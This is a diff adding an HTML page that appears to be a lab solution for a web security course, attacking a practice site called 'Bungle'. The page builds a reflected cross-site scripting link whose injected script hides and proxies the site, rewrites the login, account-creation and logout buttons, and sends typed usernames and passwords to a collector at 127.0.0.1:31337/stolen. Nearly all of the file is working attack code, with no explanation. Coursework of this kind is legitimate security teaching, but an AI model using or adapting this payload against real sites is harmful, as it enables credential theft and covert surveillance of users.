@@ -1,0 +1,62 @@
+<meta charset="utf-8">
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<script>
+// Extend this function:
+function payload(attacker) {
+
+    function proxy(href,dt,inception) {
+        function log(data) {
+            console.log($.param(data))
+            $.get("http://127.0.0.1:31337/stolen", data);
+        }
+
+        var stateObj = { foo: href };
+        history.pushState(stateObj, "page 2", href);
+
+        $("html").load(href,dt, function(){
+            var sc = document.createElement('script');
+            sc.id = 'sc';
+            $("html").append(sc);
+            $("#sc").html(inception);
+            log({event: "nav", uri: href});
+            // search button
+            $("#search-btn").attr('type',"button");
+            $("#search-btn").attr('onclick',"proxy('http://permalink.co/search?q='+$('#query').val(),'',proxy.toString());");
+            // search again button
+            $("#search-again-btn").removeAttr('href');
+            $("#search-again-btn").attr('onclick',"proxy('http://permalink.co/','',proxy.toString());");
+            // bunkle banner
+            $("#bungle-lnk").removeAttr('href');
+            $("#bungle-lnk").attr('onclick',"proxy('http://permalink.co/','',proxy.toString());");
+            // login button
+            $("#log-in-btn").attr('type',"button");
+            $("#log-in-btn").attr('onclick',"console.log('login clicked'); $.get('http://127.0.0.1:31337/stolen?event=login&user='+$('#username').val()+'&pass='+$('#userpass').val()); $.ajax({type: 'post', url: 'http://permalink.co/login',data: {username: $('#username').val(),password: $('#userpass').val()}}).done(function(msg){proxy('http://permalink.co/','',proxy.toString());})");
+            // create account button
+            $("#new-account-btn").attr('type',"button");
+            $("#new-account-btn").attr('onclick',"console.log('CA clicked'); $.get('http://127.0.0.1:31337/stolen?event=login&user='+$('#username').val()+'&pass='+$('#userpass').val()); $.ajax({type: 'post', url: 'http://permalink.co/create',data: {username: $('#username').val(),password: $('#userpass').val()}}).done(function(msg){proxy('http://permalink.co/','',proxy.toString());})");
+            // logout button
+            $("#log-out-btn").attr('type',"button");
+            $("#log-out-btn").attr('onclick',"console.log('logout clicked'); $.get('http://127.0.0.1:31337/stolen?event=logout&user='+$('#logged-in-user').html()); $.ajax({type: 'post', url: 'http://permalink.co/logout'}).done(function(msg){proxy('http://permalink.co/','',proxy.toString());})");            
+            $("html").show();        
+        }); }
+    $("html").hide();
+    proxy("./",'',proxy.toString());
+}
+
+function makeLink(xssdefense, target, attacker) {
+    if (xssdefense == 0) {
+        return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
+            encodeURIComponent("<script" + ">" + payload.toString() +
+                               ";payload(\"" + attacker + "\");</script" + ">");
+    } else {
+        // Implement code to defeat XSS defenses here.
+} }
+var xssdefense = 0;
+var target = "http://permalink.co:8080/";
+var attacker = "http://127.0.0.1:31337/stolen";
+$(function() {
+    var url = makeLink(xssdefense, target, attacker);
+    $("h3").html("<a target=\"run\" href=\"" + url + "\">Try Bungle!</a>");
+});
+</script>
+<h3></h3>
